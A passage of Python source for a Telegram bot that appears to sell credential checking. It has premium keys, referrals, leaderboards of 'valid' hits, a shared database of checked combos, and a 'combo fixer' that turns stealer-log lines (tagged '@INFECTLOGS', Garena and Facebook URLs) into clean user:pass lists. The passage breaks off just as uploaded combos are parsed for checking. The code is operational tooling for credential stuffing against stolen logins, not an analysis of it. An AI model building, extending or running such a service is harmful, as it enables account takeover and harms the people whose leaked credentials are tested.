            f"  Status: {cn_status}\n"
            f"{sep2_e}\n\n"
            f"  <b>COMMON ERRORS</b>\n\n"
            f"  INVALID — Wrong password OR\n"
            f"  no CN31/Akamai stock available.\n\n"
            f"  ERROR — Server timeout or stock\n"
            f"  ran out mid-check. Try again later.\n\n"
            f"  LOTS OF INVALIDS — Stock is low.\n"
            f"  Wait and recheck your combo when\n"
            f"  servers are back online.\n\n"
            f"{sep2_e}\n"
            f"  <b>WHAT TO DO</b>\n\n"
            f"  1. Check stock before sending files\n"
            f"  2. If stock is low, wait for refill\n"
            f"  3. Recheck returned accounts later\n"
            f"  4. Do not DM admin for checker\n"
            f"     issues caused by low stock\n"
            f"{sep_e}",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("[ CHECK AKAMAI STOCK ]", callback_data="akamai_stock")],
                [InlineKeyboardButton("[ CHECK CN31 STOCK ]",   callback_data="cn31_stock")],
                [InlineKeyboardButton("[ BACK ]",               callback_data="back_main")],
            ])
        )
        return ConversationHandler.END

    if data == "akamai_stock":
        await query.edit_message_text("Fetching Akamai stock...", parse_mode="HTML")
        msg = build_akamai_msg()
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Refresh", callback_data="akamai_stock")],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ])
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=kb)
        return ConversationHandler.END

    if data == "cn31_stock":
        await query.edit_message_text("Fetching CN31 stock...", parse_mode="HTML")
        msg = build_cn31_msg()
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Refresh", callback_data="cn31_stock")],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ])
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=kb)
        return ConversationHandler.END

    if data == "announcements":
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            announcements = db2.get("announcements", [])
        if not announcements:
            await query.edit_message_text(
                f"<b>[ ANNOUNCEMENTS ]</b>\n{sep}\n\nNo announcements yet.",
                parse_mode="HTML",
                reply_markup=back_keyboard()
            )
            return ConversationHandler.END
        text = f"<b>[ ANNOUNCEMENTS ]</b>\n{sep}\n\n"
        for ann in reversed(announcements[-5:]):
            text += f"<b>{ann.get('date', '')} — Admin</b>\n{ann.get('text', '')}\n\n"
        await query.edit_message_text(text, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data.startswith("vote_"):
        parts   = data.split("_", 2)
        vote_id = parts[1]
        choice  = parts[2] if len(parts) > 2 else None
        if choice is None:
            return ConversationHandler.END
        uid_str = str(uid)
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            vote = db2.get("votes", {}).get(vote_id)
            if not vote:
                await query.answer("Vote not found.", show_alert=True)
                return ConversationHandler.END
            if vote.get("closed"):
                await query.answer("This vote is closed.", show_alert=True)
                return ConversationHandler.END
            deadline = vote.get("deadline")
            if deadline and datetime.fromisoformat(deadline) < datetime.now():
                vote["closed"] = True
                save_db(db2)
                await query.answer("Voting has ended.", show_alert=True)
                return ConversationHandler.END
            voters = vote.get("voters", {})
            if uid_str in voters:
                await query.answer("You already voted!", show_alert=True)
                return ConversationHandler.END
            vote["results"][choice] = vote["results"].get(choice, 0) + 1
            voters[uid_str] = choice
            vote["voters"]  = voters
            save_db(db2)
        await query.answer(f" Voted: {choice}", show_alert=True)
        vote_text = build_vote_display(vote)
        vote_kb   = build_vote_keyboard(vote_id, vote)
        try:
            await query.edit_message_text(vote_text, parse_mode="HTML", reply_markup=vote_kb)
        except Exception:
            pass
        return ConversationHandler.END

    if data == "admin_panel":
        if uid != ADMIN_ID:
            await query.edit_message_text(" Access denied.", reply_markup=back_keyboard())
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>ADMIN PANEL</b>\n{sep}\n\nSelect an option:",
            parse_mode="HTML",
            reply_markup=admin_menu_keyboard()
        )
        return ConversationHandler.END

    if data == "admin_users" or data.startswith("admin_users_page_"):
        if uid != ADMIN_ID:
            return ConversationHandler.END
        page    = int(data.split("_")[-1]) if data.startswith("admin_users_page_") else 0
        PER     = 6
        db2     = get_db()
        all_u   = sorted(
            db2["users"].values(),
            key=lambda u: u.get("total_checked", 0),
            reverse=True
        )
        total_u = len(all_u)
        start   = page * PER
        end     = min(start + PER, total_u)
        chunk   = all_u[start:end]
        sep_u   = "━━━━━━━━━━━━━━━━━━━━━━━━"
        sep2_u  = "────────────────────────"
        prem_count = sum(1 for u in all_u if is_premium(u))
        lines   = [
            f"{sep_u}",
            f"  <b>ALL USERS</b>  {total_u} total | {prem_count} premium",
            f"  Page {page + 1} / {((total_u - 1) // PER) + 1}",
            f"{sep_u}",
            ""
        ]
        for u in chunk:
            prem    = is_premium(u)
            tag     = "PREMIUM" if prem else "FREE"
            name    = u.get("username") or u.get("first_name") or u["uid"]
            refs    = u.get("referral_count", 0)
            chk     = u.get("total_checked", 0)
            val     = u.get("total_valid", 0)
            ban_c   = u.get("ban_checks_remaining", 0)
            ref_pts = u.get("referral_points", 0)
            joined  = ""
            try:
                joined = datetime.fromisoformat(u.get("joined", "")).strftime("%m/%d/%y")
            except Exception:
                pass
            exp_str = ""
            if prem and u.get("premium_expires"):
                try:
                    exp_str = " until " + datetime.fromisoformat(u["premium_expires"]).strftime("%m/%d")
                except Exception:
                    pass
            lines.append(f"<b>@{name}</b>  <code>{u['uid']}</code>")
            lines.append(f"  [{tag}{exp_str}]")
            lines.append(f"  Checked: <b>{chk:,}</b>  Valid: <b>{val:,}</b>")
            lines.append(f"  Refs: <b>{refs}</b>  Ref pts: <b>{ref_pts}</b>  Ban: <b>{ban_c}</b>")
            lines.append(f"  Joined: {joined}")
            lines.append(f"{sep2_u}")

        nav_row = []
        if page > 0:
            nav_row.append(InlineKeyboardButton(
                "< PREV", callback_data=f"admin_users_page_{page - 1}"))
        if end < total_u:
            nav_row.append(InlineKeyboardButton(
                "NEXT >", callback_data=f"admin_users_page_{page + 1}"))

        rows = []
        if nav_row:
            rows.append(nav_row)
        rows.append([InlineKeyboardButton("[ BACK ]", callback_data="admin_panel")])

        await query.edit_message_text(
            "\n".join(lines),
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup(rows)
        )
        return ConversationHandler.END

    if data == "admin_premium":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        db2        = get_db()
        prem_users = [u for u in db2["users"].values() if is_premium(u)]
        msg = f"━━━━━━━━━━━━━━━━━━━━━━━━\n  <b>PREMIUM USERS ({len(prem_users)})</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        sep2 = "────────────────────────"
        for u in prem_users[:15]:
            uname2   = u.get("username") or u.get("first_name") or "N/A"
            exp      = u.get("premium_expires", "Never")
            if exp and exp != "Never":
                exp_dt    = datetime.fromisoformat(exp)
                exp_str   = exp_dt.strftime("%Y-%m-%d %H:%M")
                days_left = max(0, (exp_dt - datetime.now()).days)
                exp_info  = f"{exp_str} ({days_left}d left)"
            else:
                exp_info = "Lifetime"
            ref_count   = u.get("referral_count", 0)
            last_check  = u.get("last_check_time", None)
            lc_str      = datetime.fromisoformat(last_check).strftime("%Y-%m-%d %H:%M") if last_check else "Never"
            ref_pts     = u.get("referral_points", 0)
            msg += (
                f"<code>{u['uid']}</code> @{uname2}\n"
                f"{sep2}\n"
                f"  Expires: {exp_info}\n"
                f"  Checked: {u.get('total_checked', 0):,} | Valid: {u.get('total_valid', 0):,}\n"
                f"  Invites: {ref_count} | Ref Points: {ref_pts}\n"
                f"  Last Check: {lc_str}\n\n"
            )
        if not prem_users:
            msg += "No premium users."
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "admin_free":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        db2        = get_db()
        free_users = [u for u in db2["users"].values() if not is_premium(u)]
        msg = f" <b>FREE USERS ({len(free_users)})</b>\n{sep}\n\n"
        for u in free_users[:20]:
            uname2 = u.get("username") or u.get("first_name") or "N/A"
            reset_daily_if_needed(u)
            avail  = u.get("free_checks_remaining", 0) + u.get("referral_points", 0)
            msg += (
                f" <code>{u['uid']}</code> @{uname2}\n"
                f"   Free left: {avail} | Checked: {u.get('total_checked', 0)} "
                f"| Invites: {u.get('referral_count', 0)}\n"
            )
        if not free_users:
            msg += "No free users."
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "admin_globalstats":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        db2 = get_db()
        ensure_db_keys(db2)
        gs  = db2.get("global_stats", {})
        total_free_used = sum(u.get("free_checks_used_total", 0) for u in db2["users"].values())
        msg = (
            f" <b>GLOBAL STATS</b>\n{sep}\n\n"
            f"Total Users: {len(db2['users'])}\n"
            f"Total Checked: {gs.get('total_checked', 0):,}\n"
            f"Total Valid: {gs.get('total_valid', 0):,}\n"
            f"Total Invalid: {gs.get('total_invalid', 0):,}\n"
            f"Total Keys: {len(db2.get('keys', {}))}\n"
            f"Total Free Checks Used (all time): {total_free_used:,}\n"
            f"Total Feedback/Reports: {len(db2.get('feedback', []))}\n"
            f"Total Announcements: {len(db2.get('announcements', []))}\n"
            f"Active Votes: {sum(1 for v in db2.get('votes', {}).values() if not v.get('closed'))}\n"
        )
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "admin_genkey":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>GENERATE KEY</b>\n{sep}\n\n"
            f"What type of key do you want to generate?",
            parse_mode="HTML",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Ban Check Only", callback_data="genkey_type_ban")],
                [InlineKeyboardButton("Full Info Only", callback_data="genkey_type_semi")],
                [InlineKeyboardButton("Both (Full Access)", callback_data="genkey_type_full")],
                [InlineKeyboardButton("Back to Admin", callback_data="admin_panel")],
            ])
        )
        return ConversationHandler.END

    if data.startswith("genkey_type_"):
        if uid != ADMIN_ID:
            return ConversationHandler.END
        key_type = data.replace("genkey_type_", "")
        type_label = {"ban": "Ban Check Only", "semi": "Full Info Only", "full": "Both (Full Access)"}.get(key_type, "Full Access")
        context.user_data["awaiting_genkey"] = True
        context.user_data["genkey_type"] = key_type
        await query.edit_message_text(
            f" <b>GENERATE KEY — {type_label}</b>\n{sep}\n\n"
            f"Send key details in this format:\n\n"
            f"<code>duration_value duration_unit max_users [custom_key]</code>\n\n"
            f"Examples:\n"
            f"<code>1 days 1</code> — 1 day key, 1 user\n"
            f"<code>7 days 5</code> — 7 days, 5 users\n"
            f"<code>30 minutes 1</code> — 30 min key\n"
            f"<code>1 months 1 MYKEY-VIP</code> — custom key\n\n"
            f"Units: <code>minutes hours days months years</code>",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        return AWAITING_GENKEY_INPUT

    if data == "admin_listkeys":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        db2  = get_db()
        keys = db2.get("keys", {})
        msg  = f" <b>ALL KEYS ({len(keys)})</b>\n{sep}\n\n"
        for k, kd in list(keys.items())[:15]:
            used       = len(kd.get("used_by", []))
            max_u      = kd.get("max_users", 1)
            active     = "" if kd.get("active") else ""
            dur        = f"{kd.get('duration_value', '?')} {kd.get('duration_unit', '')}"
            ktype      = {"ban": "Ban Only", "semi": "Full Info Only", "full": "Full Access"}.get(kd.get("key_type", "full"), "Full Access")
            msg       += f"{active} <code>{k}</code>\n   {dur} | {used}/{max_u} users | {ktype}\n"
        if not keys:
            msg += "No keys generated."
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "admin_addpremium":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>ADD PREMIUM</b>\n{sep}\n\n"
            f"Send: <code>user_id duration_value duration_unit</code>\n\n"
            f"Example: <code>123456789 7 days</code>",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_addpremium"] = True
        return ConversationHandler.END

    if data == "admin_revokepremium":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>REVOKE PREMIUM</b>\n{sep}\n\n"
            f"Send user_id to revoke:\n<code>123456789</code>",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_revoke"] = True
        return ConversationHandler.END

    if data == "admin_addchecks":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>ADD FREE CHECKS</b>\n{sep}\n\n"
            f"Send: <code>user_id amount</code>\n\n"
            f"Example: <code>123456789 50</code>",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_addchecks"] = True
        return AWAITING_ADDCHECKS_INPUT

    if data == "admin_feedback":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            feedbacks = db2.get("feedback", [])
        if not feedbacks:
            await query.edit_message_text(
                f" <b>FEEDBACK / REPORTS</b>\n{sep}\n\nNo feedback yet.",
                parse_mode="HTML",
                reply_markup=back_admin_keyboard()
            )
            return ConversationHandler.END
        msg = f" <b>FEEDBACK / REPORTS ({len(feedbacks)})</b>\n{sep}\n\n"
        for fb in reversed(feedbacks[-10:]):
            sender_id   = fb.get("uid", "?")
            sender_name = fb.get("username") or fb.get("first_name") or f"User{sender_id}"
            fb_date     = fb.get("date", "?")
            fb_text     = fb.get("text", "[media/photo]")
            msg += (
                f"<b>From:</b> @{sender_name} (<code>{sender_id}</code>)\n"
                f"<b>Date:</b> {fb_date}\n"
                f"<b>Message:</b> {fb_text[:300]}\n"
                f"──────────────\n"
            )
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "admin_announce":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>SEND ANNOUNCEMENT</b>\n{sep}\n\n"
            f"You can send a text message or photo.\n"
            f"It will be broadcast to all users.\n\n"
            f"Send your announcement now:",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_announcement"] = True
        return AWAITING_ANNOUNCEMENT_MSG

    if data == "admin_vote":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>CREATE VOTE</b>\n{sep}\n\n"
            f"Send vote details in this format:\n\n"
            f"<code>Question | Choice1 | Choice2 | Duration_hours</code>\n\n"
            f"Example:\n"
            f"<code>Add new feature? | Yes | No | 24</code>\n\n"
            f"You can attach a photo too — just send the photo with caption in the format above.",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_vote"] = True
        return AWAITING_VOTE_MSG

    if data == "admin_viewvotes":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            votes = db2.get("votes", {})
        if not votes:
            await query.edit_message_text(
                f" <b>ALL VOTES</b>\n{sep}\n\nNo votes created yet.",
                parse_mode="HTML",
                reply_markup=back_admin_keyboard()
            )
            return ConversationHandler.END
        msg = f" <b>ALL VOTES</b>\n{sep}\n\n"
        for vid, vote in votes.items():
            deadline = vote.get("deadline", "?")
            closed   = vote.get("closed", False)
            status   = "CLOSED" if closed else "OPEN"
            total_v  = sum(vote.get("results", {}).values())
            msg += f"<b>[{status}]</b> {vote.get('question', '?')}\n"
            for choice, cnt in vote.get("results", {}).items():
                pct = int(cnt / total_v * 100) if total_v else 0
                msg += f"  {choice}: {cnt} votes ({pct}%)\n"
            msg += f"  Total votes: {total_v} | Deadline: {deadline}\n"
            voter_list = vote.get("voters", {})
            msg += f"  Voters ({len(voter_list)}): "
            sample = list(voter_list.keys())[:5]
            msg += ", ".join(f"<code>{v}</code>" for v in sample)
            if len(voter_list) > 5:
                msg += f" +{len(voter_list)-5} more"
            msg += "\n──────────────\n"
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "admin_broadcast":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f" <b>BROADCAST</b>\n{sep}\n\n"
            f"Send a message or photo to broadcast to ALL users.\n\n"
            f"Send your broadcast now:",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_broadcast"] = True
        return AWAITING_BROADCAST_MSG

    if data == "admin_add_combo_db":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        await query.edit_message_text(
            f"<b>[ ADD TO COMBO DATABASE ]</b>\n{sep}\n\n"
            f"Send a <b>.txt file</b> with combos in <code>user:pass</code> format.\n"
            f"Duplicates will be ignored automatically.",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        context.user_data["awaiting_admin_combo_db"] = True
        return AWAITING_CHECK_FILE

    if data == "admin_view_combo_db":
        if uid != ADMIN_ID:
            return ConversationHandler.END
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            db_entries = db2.get("combo_database", [])
        count = len(db_entries)
        msg = (
            f"<b>[ COMBO DATABASE ]</b>\n{sep}\n\n"
            f"Total entries: <b>{count:,}</b>\n\n"
            f"These combos are stored and will be skipped if any user tries to check them again."
        )
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_admin_keyboard())
        return ConversationHandler.END

    if data == "db_accounts":
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            db_count = len(db2.get("combo_database", []))
        sep2 = "────────────────────────"
        msg = (
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  <b>DATABASE ACCOUNTS</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Total accounts in database: <b>{db_count:,}</b>\n\n"
            f"{sep2}\n"
            f"These are accounts that have already been checked.\n"
            f"When you upload a combo file, you can choose to\n"
            f"scan it against this database first to skip duplicates."
        )
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data == "top_checkers":
        with data_lock:
            db2 = get_db()
            users_list = list(db2["users"].values())
        users_list.sort(key=lambda u: u.get("total_checked", 0), reverse=True)
        top = users_list[:10]
        sep2 = "────────────────────────"
        msg = f"━━━━━━━━━━━━━━━━━━━━━━━━\n  <b>TOP 10 CHECKERS</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        for i, u in enumerate(top, 1):
            uname2 = u.get("username") or u.get("first_name") or f"User{u['uid']}"
            checked = u.get("total_checked", 0)
            valid   = u.get("total_valid", 0)
            msg += f"{i}. @{uname2}\n{sep2}\n   Checked: <b>{checked:,}</b> | Valid: <b>{valid:,}</b>\n\n"
        if not top:
            msg += "No data yet."
        await query.edit_message_text(msg, parse_mode="HTML", reply_markup=back_keyboard())
        return ConversationHandler.END

    if data == "combo_fixer":
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Clean Combo", callback_data="combo_fixer_clean")],
            [InlineKeyboardButton("Remove Already Checked Accounts", callback_data="combo_fixer_dedup")],
            [InlineKeyboardButton("Back", callback_data="back_main")],
        ])
        await query.edit_message_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n  <b>COMBO FIXER</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Select an option:\n\n"
            f"<b>Clean Combo</b> — Fix format, remove URLs, remove duplicates. Converts <code>USER|PASS</code> to <code>USER:PASS</code>.\n\n"
            f"<b>Remove Already Checked</b> — Scan your combo against the database and remove accounts that were already checked.",
            parse_mode="HTML",
            reply_markup=kb
        )
        return ConversationHandler.END

    if data == "combo_fixer_clean":
        await query.edit_message_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n  <b>CLEAN COMBO</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Send your <b>.txt combo file</b>.\n\n"
            f"What it does:\n"
            f"  Converts <code>USER|PASS</code> to <code>USER:PASS</code>\n"
            f"  Removes URLs from lines\n"
            f"  Removes duplicate entries\n"
            f"  Removes invalid/garbage lines\n\n"
            f"Result will be sent back as a cleaned .txt file.",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        context.user_data["awaiting_combo_fixer_clean"] = True
        return AWAITING_CHECK_FILE

    if data == "combo_fixer_dedup":
        await query.edit_message_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n  <b>REMOVE ALREADY CHECKED</b>\n━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"Send your <b>.txt combo file</b>.\n\n"
            f"This will scan your combos against the database and remove any accounts that have already been checked by any user.\n\n"
            f"You will be asked for confirmation before the cleaned file is sent.",
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        context.user_data["awaiting_combo_fixer_dedup"] = True
        return AWAITING_CHECK_FILE

    if data.startswith("confirm_dedup_"):
        parts2  = data.split("_", 3)
        job_key = parts2[3] if len(parts2) > 3 else None
        stored  = context.user_data.get(f"dedup_job_{job_key}")
        if not stored:
            await query.edit_message_text("Session expired. Please try again.", reply_markup=back_keyboard())
            return ConversationHandler.END
        cleaned_lines = stored["cleaned"]
        removed_count = stored["removed"]
        original_count = stored["original"]
        out_bytes = "\n".join(cleaned_lines).encode("utf-8")
        out_buf   = io.BytesIO(out_bytes)
        out_buf.name = "cleaned_combo.txt"
        await context.bot.send_document(
            chat_id=query.from_user.id,
            document=out_buf,
            caption=(
                f"<b>[ COMBO CLEANED ]</b>\n\n"
                f"Original: {original_count:,}\n"
                f"Removed (already checked): {removed_count:,}\n"
                f"Remaining: {len(cleaned_lines):,}"
            ),
            parse_mode="HTML"
        )
        await query.edit_message_text(
            f"Done. {removed_count} already-checked combos removed.",
            reply_markup=back_keyboard()
        )
        return ConversationHandler.END

    if data == "cancel_dedup":
        await query.edit_message_text("Cancelled.", reply_markup=back_keyboard())
        return ConversationHandler.END

    return ConversationHandler.END

def build_vote_display(vote):
    sep      = "────────────────────────"
    question = vote.get("question", "?")
    results  = vote.get("results", {})
    deadline = vote.get("deadline", "?")
    closed   = vote.get("closed", False)
    total_v  = sum(results.values())
    status   = "CLOSED" if closed else "OPEN"

    now = datetime.now()
    if deadline and deadline != "?":
        try:
            dl_dt    = datetime.fromisoformat(deadline)
            remaining = dl_dt - now
            if remaining.total_seconds() > 0:
                hrs  = int(remaining.total_seconds() // 3600)
                mins = int((remaining.total_seconds() % 3600) // 60)
                time_left = f"{hrs}h {mins}m remaining"
            else:
                time_left = "Voting ended"
        except Exception:
            time_left = deadline
    else:
        time_left = "No deadline"

    text = f"<b>[ VOTE — {status} ]</b>\n{sep}\n\n"
    text += f"<b>{question}</b>\n\n"
    for choice, cnt in results.items():
        pct   = int(cnt / total_v * 100) if total_v else 0
        bar   = "█" * (pct // 10) + "░" * (10 - pct // 10)
        text += f"{choice}\n{bar} {cnt} votes ({pct}%)\n\n"
    text += f"Total votes: {total_v}\n"
    text += f"⏳ {time_left}"
    return text

def build_vote_keyboard(vote_id, vote):
    if vote.get("closed"):
        return back_keyboard()
    deadline = vote.get("deadline")
    if deadline:
        try:
            if datetime.fromisoformat(deadline) < datetime.now():
                return back_keyboard()
        except Exception:
            pass
    choices = list(vote.get("results", {}).keys())
    rows    = []
    for choice in choices:
        rows.append([InlineKeyboardButton(f" {choice}", callback_data=f"vote_{vote_id}_{choice}")])
    rows.append([InlineKeyboardButton(" Back", callback_data="back_main")])
    return InlineKeyboardMarkup(rows)

async def receive_check_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid     = update.effective_user.id
    doc     = update.message.document
    chat_id = update.effective_chat.id
    sep     = "────────────────────────"

    if context.user_data.get("awaiting_hit_mode"):
        return AWAITING_CHECK_FILE

    if not doc or not doc.file_name.endswith(".txt"):
        await update.message.reply_text("Please send a .txt file.", reply_markup=back_keyboard())
        return AWAITING_CHECK_FILE

    file = await context.bot.get_file(doc.file_id)

    def _dlbar(n, w=10):
        return "█" * n + "░" * (w - n)

    dl_msg = await update.message.reply_text(
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  <b>DOWNLOADING</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
        f"  [{_dlbar(0)}]  0%\n"
        f"  {doc.file_name}",
        parse_mode="HTML"
    )

    dl_task = asyncio.create_task(file.download_as_bytearray())

    for _i in range(1, 10):
        await asyncio.sleep(0.12)
        if dl_task.done():
            break
        try:
            await dl_msg.edit_text(
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
                f"  <b>DOWNLOADING</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"  [{_dlbar(_i)}]  {_i * 10}%\n"
                f"  {doc.file_name}",
                parse_mode="HTML"
            )
        except Exception:
            pass

    buf = await dl_task

    try:
        await dl_msg.edit_text(
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"  <b>DOWNLOADING</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            f"  [{_dlbar(10)}]  100%\n"
            f"  {doc.file_name}",
            parse_mode="HTML"
        )
        await asyncio.sleep(0.4)
        await dl_msg.delete()
    except Exception:
        pass

    raw_text = buf.decode("utf-8", errors="ignore")

    if context.user_data.get("awaiting_admin_combo_db") and uid == ADMIN_ID:
        context.user_data["awaiting_admin_combo_db"] = False
        lines = [ln.strip() for ln in raw_text.splitlines() if ":" in ln.strip()]
        added = 0
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            existing = set(db2["combo_database"])
            for line in lines:
                if line not in existing:
                    db2["combo_database"].append(line)
                    existing.add(line)
                    added += 1
            save_db(db2)
        await update.message.reply_text(
            f"<b>[ DATABASE UPDATED ]</b>\n{sep}\n\n"
            f"Loaded: {len(lines):,} lines\n"
            f"Added new: {added:,}\n"
            f"Duplicates skipped: {len(lines) - added:,}",
            parse_mode="HTML",
            reply_markup=back_admin_keyboard()
        )
        return ConversationHandler.END

    if context.user_data.get("awaiting_combo_fixer_clean"):
        context.user_data["awaiting_combo_fixer_clean"] = False
        import re as _re
        def _process_line(line):
            line = line.strip()
            if not line:
                return None
            line = _re.sub(r'https?://\S+', '', line, flags=_re.IGNORECASE).strip()
            line = _re.sub(r'www\.\S+', '', line, flags=_re.IGNORECASE).strip()
            line = _re.sub(r'android://\S+', '', line, flags=_re.IGNORECASE).strip()
            line = _re.sub(r'@INFECTLOGS\S*', '', line, flags=_re.IGNORECASE).strip()
            if '|' in line and ':' not in line:
                line = line.replace('|', ':', 1)
            if ':' not in line:
                return None
            parts = line.split(':', 1)
            u, p = parts[0].strip(), parts[1].strip()
            if not u or not p or len(u) < 3 or len(p) < 3:
                return None
            if any(bad in u.lower() for bad in ['http', 'www.', '.com', '.net', '.org', 'garena', 'facebook']):
                return None
            return f"{u}:{p}"
        lines = raw_text.splitlines()
        total = len([l for l in lines if l.strip()])
        credentials = []
        seen = set()
        urls_removed = 0
        invalid_removed = 0
        for line in lines:
            original = line.strip()
            if not original:
                continue
            had_url = bool(_re.search(
                r'https?://|www\.|android://|\.com|\.net|\.org|\.io|\.co|garena|gaslite|facebook|//\d+\.connect|@INFECTLOGS',
                original, _re.IGNORECASE
            ))
            processed = _process_line(original)
            if processed and processed not in seen:
                credentials.append(processed)
                seen.add(processed)
                if had_url:
                    urls_removed += 1
            elif not processed:
                invalid_removed += 1
        duplicates_removed = total - len(credentials) - invalid_removed
        out_bytes = "\n".join(credentials).encode("utf-8")
        out_buf = io.BytesIO(out_bytes)
        out_buf.name = "cleaned_combo.txt"
        await update.message.reply_document(
            document=out_buf,
            caption=(
                f"<b>[ COMBO CLEANED ]</b>\n{sep}\n\n"
                f"Total processed: {total:,}\n"
                f"Valid (user:pass): {len(credentials):,}\n"
                f"URLs removed/fixed: {urls_removed:,}\n"
                f"Invalid removed: {invalid_removed:,}\n"
                f"Duplicates removed: {duplicates_removed:,}"
            ),
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        return ConversationHandler.END

    if context.user_data.get("awaiting_combo_fixer_dedup"):
        context.user_data["awaiting_combo_fixer_dedup"] = False
        lines = [ln.strip() for ln in raw_text.splitlines() if ":" in ln.strip()]
        with data_lock:
            db2 = get_db()
            ensure_db_keys(db2)
            db_set = set(db2["combo_database"])
        cleaned = [l for l in lines if l not in db_set]
        removed = len(lines) - len(cleaned)
        if not cleaned:
            await update.message.reply_text(
                f"<b>[ SCAN COMPLETE ]</b>\n{sep}\n\n"
                f"Original combos: {len(lines):,}\n"
                f"Already checked: {removed:,}\n"
                f"Remaining: <b>0</b>\n\n"
                f"All accounts in your file are already in the database. Nothing to send.",
                parse_mode="HTML",
                reply_markup=back_keyboard()
            )
            return ConversationHandler.END
        out_bytes = "\n".join(cleaned).encode("utf-8")
        out_buf = io.BytesIO(out_bytes)
        out_buf.name = "cleaned_combo.txt"
        await update.message.reply_document(
            document=out_buf,
            caption=(
                f"<b>[ COMBO CLEANED ]</b>\n{sep}\n\n"
                f"Original: {len(lines):,}\n"
                f"Already checked (removed): {removed:,}\n"
                f"Remaining (not in DB): <b>{len(cleaned):,}</b>"
            ),
            parse_mode="HTML",
            reply_markup=back_keyboard()
        )
        return ConversationHandler.END

    with data_lock:
        db   = get_db()
        user = get_user(db, uid)
        reset_daily_if_needed(user)
        prem = is_premium(user)
        save_db(db)

    status_msg = await update.message.reply_text("Downloading file...")

    all_lines = [ln.strip() for ln in raw_text.splitlines() if ":" in ln.strip()]

    if not all_lines:
        await status_msg.edit_text(" No valid accounts found in file (format: email:password).")
        return ConversationHandler.END

    combos = []
    for combo in all_lines:
        parts = combo.split(":", 1)
        if len(parts) != 2:
            continue
